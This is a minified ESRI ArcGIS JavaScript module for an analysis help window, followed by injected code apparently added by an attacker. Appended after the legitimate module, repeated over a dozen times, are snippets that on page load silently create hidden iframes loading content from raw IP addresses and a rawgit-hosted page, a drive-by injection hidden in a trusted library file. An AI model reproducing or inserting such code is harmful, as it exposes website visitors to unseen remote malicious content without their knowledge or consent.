// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("require dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/_base/kernel dojo/has dijit/_Widget jimu/dijit/Popup esri/kernel esri/lang esri/request".split(" "),function(k,l,e,h,g,n,p,q,r,m,t){e=e([p],{basePath:k.toUrl("esri/dijit/analysis"),onlineHelpMap:null,showLearnMore:!1,"class":"esriAnalyisHelpWindow",postMixInProperties:function(){this.inherited(arguments)},postCreate:function(){this.inherited(arguments);var b=["ar","he"],a,c;this.onlineHelpMap={};for(a=0;a<b.length;a+=1)c=b[a],
g.locale&&-1!==g.locale.indexOf(c)&&(-1!==g.locale.indexOf("-")?-1!==g.locale.indexOf(c+"-")&&(this._isRightToLeft=!0):this._isRightToLeft=!0);b=this._getAbsoluteUrl(this.basePath)+"/help/helpmap.json";t({url:b}).then(h.hitch(this,function(a){this.onlineHelpMap=a.map}))},_getAbsoluteUrl:function(b){if(/^https?\:/i.test(b))return b;if(/^\/\//i.test(b))return window.location.protocol+b;if(/^\//i.test(b))return window.location.protocol+"//"+window.location.host+b},_computeSize:function(b){var a={w:400,
h:200};-1!==b.indexOf("Category")?(a.w=400,a.h=320):-1!==b.indexOf("Tool")?(a.w=400,a.h=320):-1!==b.indexOf("toolDescription")&&(a.w=400,a.h=520);return a},generateHelpUrl:function(b,a){var c,d,f;this._analysisGpServer&&-1!==this._analysisGpServer.indexOf("dev")||this._analysisGpServer&&this._analysisGpServer.indexOf("qa");c=h.clone(g.locale);"nb"===c&&(c="no");d=k.toUrl("esri/dijit/analysis/help/");f=d+b+".html";-1!==l.indexOf("ar cs da de es et fi fr it ja ko lt lv ru nl no pl pt-br pt-pt ro sv th tr vi zh-cn".split(" "),
c)&&(-1!==c.indexOf("-")&&(c=c.split("-"),c=c[0]+"-"+c[1].toUpperCase()),f=d+c+"/"+b+".html");return f+"#"+a},_setHelpTopic:function(b){this.tooltipHelpDlg&&(this.tooltipHelpDlg.destroy(),this.tooltipHelpDlg=null);var a,c,d,f,e;this.showLearnMore=!1;e=this._analysisGpServer&&-1!==this._analysisGpServer.indexOf("dev")?"dev":this._analysisGpServer&&-1!==this._analysisGpServer.indexOf("qa")?"uat":"";a=h.clone(g.locale);"nb"===a&&(a="no");c=k.toUrl("esri/dijit/analysis/help/");d=c+this.helpFileName+".html";
m.isDefined(this.onlineHelpMap[this.helpFileName])&&m.isDefined(this.onlineHelpMap[this.helpFileName][b])&&(this.showLearnMore=!0,f="http://doc"+e+".arcgis.com/en/arcgis-online/use-maps/"+this.onlineHelpMap[this.helpFileName][b]);-1!==l.indexOf("ar cs da de es et fi fr it ja ko lt lv ru nl no pl pt-br pt-pt ro sv th tr vi zh-cn".split(" "),a)&&(-1!==a.indexOf("-")&&(d=a.split("-"),a=d[0]+"-"+d[1].toUpperCase()),d=c+a+"/"+this.helpFileName+".html");-1!==l.indexOf("ar da de es fr it ja ko ru nl no pl pt-br pt-pt ro sv zh-cn".split(" "),
a)&&this.showLearnMore&&(f="http://doc"+e+".arcgis.com/"+a+"/arcgis-online/use-maps/"+this.onlineHelpMap[this.helpFileName][b]);c=this._computeSize(b);this.structure="\x3cdiv class\x3d'' style\x3d'position:relative'\x3e\x3cdiv class\x3d'sizer content'\x3e\x3cdiv class\x3d'contentPane'\x3e\x3ciframe frameborder\x3d'0'  id\x3d'"+b+"' src\x3d'"+d+"#"+b+"' width\x3d'"+c.w+"' height\x3d'"+c.h+"' marginheight\x3d'0' marginwidth\x3d'0'\x3e\x3c/iframe\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d'sizer'\x3e\x3cdiv class\x3d'actionsPane'\x3e\x3cdiv class\x3d'actionList"+
(this.showLearnMore?"'\x3e":" hidden'\x3e")+"\x3ca class\x3d'action zoomTo' href\x3d'"+(this.showLearnMore?f:"#")+"' target\x3d'_help'\x3e"+this.nls.learnMore+"\x3c/a\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e"},show:function(b,a){console.log(b);this.helpFileName=a.helpFileName;this._analysisGpServer=a.analysisGpServer;this._setHelpTopic(a.helpId);new q({titleLabel:this.helpFileName,content:this.structure,width:480,maxHeight:300})}});n("extend-esri")&&h.setObject("dijit.analysis.HelpWindow",
e,r);return e});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});